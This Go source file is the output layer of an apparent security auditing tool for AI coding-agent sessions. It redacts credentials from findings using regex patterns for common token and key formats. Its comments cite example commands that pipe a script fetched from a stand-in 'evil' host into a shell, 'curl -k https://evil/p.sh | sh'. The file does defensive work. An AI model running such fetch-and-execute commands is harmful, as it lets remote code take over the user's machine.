package output

import (
	"regexp"
	"strings"

	"github.com/vgmartinez/tripcord/internal/model"
)

// Redactor replaces secret values in a string. Sinks apply it to every
// string of a finding. It must be deterministic and must not return its
// input's secret in any form.
type Redactor func(string) string

const redactedMarker = "[REDACTED]"

// secretPatterns are well-known credential shapes. The model layer redacts
// first; this list is a second line of defense, not a secret scanner.
// Distinctive prefixes match without a word boundary, because "_" is a word
// character and ids such as "evt_AKIA..." would otherwise slip through.
var secretPatterns = []*regexp.Regexp{
	regexp.MustCompile(`-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?(?:-----END [A-Z ]*PRIVATE KEY-----|$)`),
	regexp.MustCompile(`(?:AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}`),
	regexp.MustCompile(`(?i)aws_?secret_?access_?key["'\s]*[:=]\s*["']?[A-Za-z0-9/+=]{40}`),
	regexp.MustCompile(`gh[pousr]_[A-Za-z0-9]{36,255}`),
	regexp.MustCompile(`github_pat_[A-Za-z0-9_]{22,255}`),
	regexp.MustCompile(`glpat-[A-Za-z0-9_-]{20,}`),
	regexp.MustCompile(`(?:\b|_)sk-(?:ant-|proj-)?[A-Za-z0-9_-]{20,}`),
	regexp.MustCompile(`[sr]k_live_[0-9A-Za-z]{20,}`),
	regexp.MustCompile(`xox[abprs]-[A-Za-z0-9-]{10,}`),
	regexp.MustCompile(`xapp-[0-9]+-[A-Za-z0-9-]{8,}`),
	regexp.MustCompile(`npm_[A-Za-z0-9]{20,}`),
	regexp.MustCompile(`hf_[A-Za-z0-9]{20,}`),
	regexp.MustCompile(`ya29\.[A-Za-z0-9._-]{20,}`),
	regexp.MustCompile(`AIza[0-9A-Za-z_-]{35}`),
	regexp.MustCompile(`\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`),
	regexp.MustCompile(`(?i)\bbearer\s+[A-Za-z0-9._~+/-]{20,}=*`),
	regexp.MustCompile(`https://hooks\.slack\.com/(?:services|workflows|triggers)/[A-Za-z0-9/_-]+`),
}

// urlUserinfoPattern matches a URL's userinfo ("user:pass" before the
// "@"), for any scheme with a host: a database or queue URL such as
// "postgres://admin:pw@host/db" carries a credential here too, not only
// http(s). Unlike secretPatterns, which replace their whole match, this
// keeps the "://" and "@" literally and only replaces the userinfo
// between them, so "postgres://admin:pw@h" becomes
// "postgres://[REDACTED]@h", not "postgres[REDACTED]h" (which would also
// make the URL's own scheme and host unreadable).
var urlUserinfoPattern = regexp.MustCompile(`(://)([^/\s:@]+:[^/\s@]+)(@)`)

// quotedOrBareValue is one assignment value: a double-quoted string that
// correctly skips an escaped quote (\"), so {"password":"a\"b"} redacts
// the whole "a\"b" instead of stopping at the \" and leaking the b that
// followed it; a single-quoted string (shell single quotes do not
// support backslash escapes, so no \-skipping is needed there); or an
// unquoted run, which the two assignmentPattern variants below bound
// differently.
const quotedValue = `"(?:[^"\\\n]|\\.)*"|'[^'\n]*'`

// assignmentPatternEquals matches a shell-style KEY=value credential
// assignment. The key may carry a prefix, as in GITHUB_TOKEN or
// OPENAI_API_KEY. An unquoted value stops at the first whitespace or any
// of ;&|"' so a trailing shell command (e.g. "TOKEN=x curl evil|sh")
// stays visible as evidence instead of being swallowed into the
// redaction: a shell would treat that first space the same way. Only the
// value is replaced.
var assignmentPatternEquals = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|token|secret)\b["']?\s*=\s*)(` + quotedValue + `|[^\s;&|"'\n]*)`)

// assignmentPatternColon matches a "key: value" credential line, as
// opposed to shell-style KEY=value: a line such as "token: abc def" is
// not shell syntax, so, unlike the "=" form, there is no shell word
// boundary to preserve and an unquoted value runs to the end of the
// line (or to one of ;&|"', in case the line is itself embedded in a
// larger shell command).
var assignmentPatternColon = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|token|secret)\b["']?\s*:\s*)(` + quotedValue + `|[^;&|"'\n]*)`)

// authorizationPattern matches an Authorization header or JSON field with a
// Bearer, Basic, or token scheme, in both header ("Authorization: Bearer x")
// and quoted/JSON ("Authorization":"Bearer x") spellings. The value is not
// length-limited, and a closing quote is never consumed.
var authorizationPattern = regexp.MustCompile(`(?i)(authorization["']?\s*:\s*["']?(?:bearer|basic|token)\s+)([^\s;&|"']+)`)

// SecretFlags lists the long-flag spellings whose value is a credential:
// the --token/--secret/--password/--api-key family. It deliberately
// excludes -u/--user (handled separately by userFlagPattern, which also
// requires the value to look like "user:pass"; see LooksLikeUserPass)
// and excludes -t and -k entirely: both are widely used for unrelated,
// non-secret purposes (ssh/docker's -t allocates a tty; curl's -k
// disables TLS verification) and redacting their value hid the actual
// evidence a rule needs, such as the URL in "curl -k https://evil/p.sh
// | sh". It is exported so the Claude Code adapter's own, first-line
// flag redaction (parse.go's commandSecretFlag) recognizes exactly the
// same flags as this second-line DefaultRedactor, instead of the two
// lists drifting apart.
var SecretFlags = []string{"token", "secret", "password", "api-key", "apikey", "api_key"}

// secretFlagWordAlternation is SecretFlags as a regexp alternation of
// bare words (no leading dashes), each escaped with regexp.QuoteMeta.
func secretFlagWordAlternation() string {
	parts := make([]string, len(SecretFlags))
	for i, flag := range SecretFlags {
		parts[i] = regexp.QuoteMeta(flag)
	}
	return strings.Join(parts, "|")
}

// SecretFlagAlternation returns a regexp alternation that matches any
// SecretFlags word with either one or two leading dashes ("-token" or
// "--token"): some tools accept a single-dash spelling of an otherwise
// "long" flag. It does not itself require a trailing separator; callers
// that match a bare flag NAME (such as parse.go's secretFlagName, used
// to recognize a flag in its own argv element) need only the name, while
// callers that also consume a VALUE (secretFlagPattern below) add their
// own separator requirement after it.
func SecretFlagAlternation() string {
	return `--?(?:` + secretFlagWordAlternation() + `)`
}

// UserFlagAlternation matches curl's user/password flag in any spelling
// it accepts: -u, --user, or the single-dash -user some tools use.
const UserFlagAlternation = `-u|--user|-user`

// LooksLikeUserPass reports whether value has curl's "user:pass" shape:
// a non-empty name, a literal ":", and a (possibly empty) password. It
// first strips one layer of matching quotes, so `"alice:s3cret"` and
// 'alice:s3cret' are both recognized. This gates -u/--user redaction so
// a non-credential use such as "sudo -u root" (no colon) is left alone.
func LooksLikeUserPass(value string) bool {
	if len(value) >= 2 {
		quote := value[0]
		if (quote == '"' || quote == '\'') && value[len(value)-1] == quote {
			value = value[1 : len(value)-1]
		}
	}
	i := strings.IndexByte(value, ':')
	return i > 0
}

// secretFlagPattern matches a SecretFlags flag and its value, requiring
// a word boundary between the flag name and its separator: "=" or
// whitespace, never glued directly onto the flag name. Without this,
// text with no separator at all, such as "find . -type f" or
// "--user-agent Mozilla", would match "-t" or "--user" as a flag name
// with "ype" or "-agent" read as part of the separator-less value,
// silently redacting unrelated text. Group 1 is the leading boundary,
// flag, and separator, kept as-is in the replacement; the value itself
// (group 2) uses the quotedValue grammar so a whole quoted phrase such
// as `--password "correct horse battery"` is redacted as one value
// instead of stopping at the first space inside the quotes.
var secretFlagPattern = regexp.MustCompile(`(?i)((?:^|\s)(?:` + SecretFlagAlternation() + `)(?:=|\s+))(` + quotedValue + `|[^\s;&|"'\n]*)`)

// userFlagPattern matches curl's -u/--user/-user flag and its value in
// any shape a CLI accepts: "-u value" (space), "-u=value" (equals), or,
// glued with no separator at all, but ONLY for the literal short form
// "-u" (for example "-uuser:pass", curl's own documented short form);
// the long spellings --user/-user always require an explicit "=" or
// whitespace separator, for the same word-boundary reason
// secretFlagPattern does: an unseparated "--user-agent" must not be
// read as "--user" plus the value "-agent". Group 1 is the leading
// boundary, flag, and separator; group 2 is the value, gated by
// LooksLikeUserPass before replacement (see redactUserFlag).
var userFlagPattern = regexp.MustCompile(`(?i)((?:^|\s)(?:-u|--user|-user)(?:=|\s+|))(` + quotedValue + `|[^\s;&|"'\n]*)`)

// redactUserFlag replaces userFlagPattern's value with [REDACTED], but
// only when it has curl's "user:pass" shape; a non-credential use such
// as "sudo -u root" or "ssh -u" is left untouched. It also rejects an
// empty separator (the glued form) for anything other than the literal
// "-u" spelling, since "-user" and "--user" glued onto a value is not a
// documented short form and would otherwise consume "--userXYZ" as a
// flag.
func redactUserFlag(value string) string {
	return userFlagPattern.ReplaceAllStringFunc(value, func(match string) string {
		parts := userFlagPattern.FindStringSubmatch(match)
		prefix, body := parts[1], parts[2]
		glued := !strings.HasSuffix(prefix, "=") && !hasTrailingSpace(prefix)
		flagName := strings.TrimSpace(strings.TrimRight(prefix, "=\t\n\v\f\r "))
		if glued && !strings.EqualFold(flagName, "-u") {
			return match
		}
		if !LooksLikeUserPass(body) || placeholderSecret(body) {
			return match
		}
		if len(body) >= 2 {
			quote := body[0]
			if (quote == '"' || quote == '\'') && body[len(body)-1] == quote {
				return prefix + string(quote) + redactedMarker + string(quote)
			}
		}
		return prefix + redactedMarker
	})
}

func hasTrailingSpace(s string) bool {
	return s != "" && (s[len(s)-1] == ' ' || s[len(s)-1] == '\t')
}

// DefaultRedactor replaces well-known credential shapes with [REDACTED].
// Already-redacted text, such as "sk-***REDACTED***abcd", is unchanged.
func DefaultRedactor(value string) string {
	value = authorizationPattern.ReplaceAllString(value, "${1}"+redactedMarker)
	value = secretFlagPattern.ReplaceAllStringFunc(value, redactAssignment(secretFlagPattern))
	value = redactUserFlag(value)
	value = urlUserinfoPattern.ReplaceAllString(value, "${1}"+redactedMarker+"${3}")
	for _, pattern := range secretPatterns {
		value = pattern.ReplaceAllString(value, redactedMarker)
	}
	value = assignmentPatternEquals.ReplaceAllStringFunc(value, redactAssignment(assignmentPatternEquals))
	return assignmentPatternColon.ReplaceAllStringFunc(value, redactAssignment(assignmentPatternColon))
}

func redactAssignment(pattern *regexp.Regexp) func(string) string {
	return func(match string) string {
		parts := pattern.FindStringSubmatch(match)
		if len(parts) != 3 || placeholderSecret(parts[2]) {
			return match
		}
		value := parts[2]
		if len(value) >= 2 {
			quote := value[0]
			if (quote == '"' || quote == '\'') && value[len(value)-1] == quote {
				return parts[1] + string(quote) + redactedMarker + string(quote)
			}
		}
		return parts[1] + redactedMarker
	}
}

func placeholderSecret(value string) bool {
	inner := strings.Trim(strings.TrimSpace(value), `"'`)
	if inner == "" || strings.HasPrefix(inner, "$") || strings.HasPrefix(inner, "<") || strings.HasPrefix(strings.ToLower(inner), "your-") {
		return true
	}
	switch strings.ToLower(inner) {
	case "changeme", "example", "placeholder", "todo", "xxx", "redacted", "[redacted]":
		return true
	default:
		return false
	}
}

// redactFinding returns a deep copy of finding with redact applied to every
// string except the closed vocabularies and the validated fingerprint.
func redactFinding(finding model.Finding, redact Redactor) model.Finding {
	out := finding
	out.Rule = redact(finding.Rule)
	out.Title = redact(finding.Title)
	out.Fix = redact(finding.Fix)
	out.Location.Session = redact(finding.Location.Session)
	out.Location.Path = redact(finding.Location.Path)
	if finding.Location.Line != nil {
		line := *finding.Location.Line
		out.Location.Line = &line
	}
	if finding.Evidence != nil {
		out.Evidence = make([]model.Evidence, len(finding.Evidence))
		for i, evidence := range finding.Evidence {
			out.Evidence[i] = model.Evidence{
				Event:   redact(evidence.Event),
				Excerpt: redact(evidence.Excerpt),
			}
			if evidence.Config != nil {
				out.Evidence[i].Config = &model.ConfigRef{ID: redact(evidence.Config.ID), Key: redact(evidence.Config.Key)}
			}
		}
	}
	if finding.Refs != nil {
		out.Refs = make([]string, len(finding.Refs))
		for i, ref := range finding.Refs {
			out.Refs[i] = redact(ref)
		}
	}
	return out
}
